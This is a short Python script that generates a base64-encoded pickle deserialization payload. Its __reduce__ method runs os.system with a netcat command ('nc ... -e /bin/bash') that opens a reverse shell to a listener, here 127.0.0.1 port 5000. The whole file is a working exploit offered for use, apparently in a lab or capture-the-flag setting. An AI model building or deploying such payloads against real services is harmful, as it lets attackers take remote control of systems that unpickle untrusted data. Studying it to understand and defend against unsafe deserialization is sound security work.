import pickle 
import base64 
import os

class payload:
    def __reduce__(self):
        return (os.system, ("nc 127.0.0.1 5000 -e /bin/bash",))

print(base64.b64encode(pickle.dumps(payload())))
